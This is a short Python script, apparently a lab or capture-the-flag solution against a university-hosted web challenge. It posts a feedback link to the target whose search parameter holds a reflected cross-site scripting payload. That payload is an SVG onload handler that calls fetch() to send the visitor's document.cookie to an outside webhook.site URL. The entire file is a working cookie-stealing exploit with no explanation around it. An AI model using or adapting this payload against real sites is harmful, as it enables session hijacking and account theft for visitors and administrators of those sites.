import requests
import urllib.parse

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22252"
webhook_url = "https://webhook.site/c26c9651-fb87-4c78-a9a0-b597dee9fcc1"

s = requests.Session()

data = { 'feedback_link' : link + '/?search=' + urllib.parse.quote('<svg onload=fetch("' + webhook_url + '?cookie="+document.cookie)></svg>') }
s.post(link + "/submit_feedback", data = data)